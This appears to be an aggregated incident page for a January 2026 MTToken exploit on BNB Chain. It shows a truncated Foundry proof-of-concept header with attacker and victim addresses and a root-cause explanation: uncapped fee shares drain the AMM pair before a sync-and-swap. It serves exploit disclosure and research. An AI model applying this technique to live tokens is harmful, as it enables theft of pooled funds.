# [?] MTToken - Incorrect Fee Logic

## Summary
Severity: Unknown
Chain: BNB Chain
Component: MTToken
Published: 2026-01-12
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-01/MTToken_exp.sol
Type: defi-exploit-poc

## Details
Lost: 37K USD

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";

// @KeyInfo - Net Pool Loss : ~36,995.244786737651151991 USDT / Gross USDT outflow from pool: ~226,722.244786737651151991 USDT
// Attacker profit: ~36,995.244786737651151991 USDT
// Attacker EOA : 0xe918a1784ceca08e51a1b740f4036fd149339811
// Flashloan Receiver (deployed in tx) : 0xb64f5d49656fae38655ef2e3c2e3768ddb5f3d5c
// Victim Token : 0x2f3f25046ea518d1e524b8fb6147c656d6722ced (MT)
// Victim Pair : 0xbf4707b7f9f53e3aae29bf2558cb373419ef4d45 (MT/USDT PancakeV2 pair)
// Attack Tx (BSC) : https://skylens.certik.com/tx/arb/0xe1e6aa5332deaf0fa0a3584113c17bedc906148730cbbc73efae16306121687b
//
// Root cause: MT token's `transactionFee()` splits `transactFeeValue` by an unbounded list of percentages without enforcing
// `sum(shares) <= 100`, allowing a transfer to debit the sender for far more than `amount`. AMM pairs are contracts and
// become unintended fee targets; after draining MT balance the attacker calls `sync()` and swaps a small amount of MT to
// drain USDT.
// 
// Post-mortem : https://x.com/nn0b0dyyy/status/2010638145155661942?s=20
// Twitter Alert : https://x.com/TenArmorAlert/status/2010630024274010460?s=20

contract MTExploitTest is Test {
    uint256 internal constant ATTACK_BLOCK = 74_937_080;
    uint256 internal constant FORK_BLOCK = ATTACK_BLOCK - 1;
    uint256 internal constant ATTACK_TIMESTAMP = 1_768_205_155;

    IERC20 internal constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 internal constant MT = IERC20(0x2f3f25046Ea518d1E524B8fB6147c656D6722CeD);

    IPancakeV2Router internal constant ROUTER = IPancakeV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IPancakeV2Pair internal constant PAIR = IPancakeV2Pair(0xbf4707B7f9F53e3aAE29Bf2558CB373419Ef4D45);

    IMoolahFlashLoan internal constant FLASHLOAN = IMoolahFlashLoan(0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C);

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-01/MTToken_exp.sol_
